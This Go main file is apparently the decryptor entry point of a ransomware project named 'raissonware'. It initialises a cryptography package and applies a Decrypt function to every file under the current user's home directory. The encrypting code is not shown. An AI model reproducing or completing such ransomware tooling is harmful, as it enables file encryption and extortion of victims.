package main

import (
	"os/user"
	"raissonware/pkg/cryptography"
	"raissonware/pkg/filesystem"
	"sync"
)

var (
	wg sync.WaitGroup
)

func main() {
	defer wg.Wait()

	err := cryptography.Init(nil, nil)
	if err != nil {
		return
	}

	Client, err := user.Current()
	if err != nil {
		return
	}

	chanErr := make(chan error)
	filesystem.FindFiles(Client.HomeDir, cryptography.Decrypt, &wg, chanErr)
}
